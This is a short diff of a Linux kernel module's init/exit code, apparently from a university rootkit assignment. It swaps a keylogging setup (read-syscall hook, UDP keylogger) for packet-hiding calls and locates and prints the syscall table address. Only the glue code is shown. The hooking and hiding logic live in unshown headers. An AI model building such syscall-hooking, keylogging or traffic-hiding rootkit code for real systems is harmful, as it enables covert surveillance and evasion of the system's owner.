@@ -3,31 +3,28 @@
 #include <linux/init.h> /* Needed for the macros, hints for linking and loading, see http://tldp.org/LDP/lkmpg/2.6/html/x245.html */
 
 #include "hooking.h"
-#include "read_hooking.h"
-#include "keylogging_udp.h"
+#include "packet_hiding.h"
 
 #define DRIVER_AUTHOR "Nicolas Appel, Wenwen Chen"
-#define DRIVER_DESC   "Assigment 9 - Keylogging"
+#define DRIVER_DESC   "Assigment 10 - Packet Hiding"
 
 static void ** sct;
 static int __init mod_init(void)
 {
+	sct = syscall_table();
+	if(sct != NULL)
+	printk(KERN_INFO "syscall table:%016lx\n",(long unsigned int) sct);
+	else return 0;
 
-  sct = syscall_table();
-  if(sct != NULL)
-    printk(KERN_INFO "syscall table:%016lx\n",(long unsigned int) sct);
-  else return 0;
+	hide_packets();
 
-  prepare_keylogging();
-  hook_read(sct);
-  return 0;
+	return 0;
 }
 
 static void __exit mod_exit(void)
 {
-  if(sct == NULL) return;
-  unhook_read(sct);
-  release_keylogging();
+	if(sct == NULL) return;
+	unhide_packets();
 }
 
 
